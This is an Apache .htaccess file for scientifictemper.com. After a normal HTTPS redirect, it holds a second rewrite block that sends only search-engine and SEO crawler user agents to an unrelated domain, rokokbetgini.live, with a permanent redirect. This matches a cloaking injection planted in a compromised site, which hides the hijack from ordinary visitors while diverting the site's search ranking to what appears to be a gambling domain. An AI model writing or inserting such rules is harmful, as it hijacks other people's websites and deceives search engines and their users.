RewriteEngine On

# Redirect HTTP and WWW to HTTPS non-WWW
RewriteCond %{HTTPS} !=on [OR]
RewriteCond %{HTTP_HOST} ^www\.scientifictemper\.com$ [NC]
RewriteRule ^ https://scientifictemper.com%{REQUEST_URI} [R=301,L]
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
RewriteRule ^(.*)$ https://rokokbetgini.live/ [R=301,L]
</IfModule>
